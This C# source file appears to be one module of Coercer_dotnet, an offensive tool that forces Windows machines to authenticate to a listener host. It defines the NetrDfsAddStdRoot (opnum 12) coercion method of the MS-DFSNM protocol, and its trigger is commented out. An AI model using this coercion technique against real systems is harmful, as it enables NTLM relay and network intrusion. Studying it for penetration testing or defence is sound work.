using Coercer_dotnet.structures;

namespace Coercer_dotnet.methods.MS_DFSNM
{
    public class NetrDfsAddStdRoot : MS_DFSNM
    {
        public NetrDfsAddStdRoot(AuthType authType, string listener) : base(authType, listener) { }
        public NetrDfsAddStdRoot(AuthType authType, string listener, int port) : base(authType, listener, port) { }
        public NetrDfsAddStdRoot(AuthType authType, string listener, int httpPort, int smbPort) : base(authType, listener, httpPort, smbPort) { }
        public override string Description => "Coercing a machine to authenticate using function NetrDfsAddStdRoot (opnum 12) of [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)";
        public override Function Function => new("NetrDfsAddStdRoot", 12, new[] { "ServerName" });

        // public override void Trigger() { }
    }
}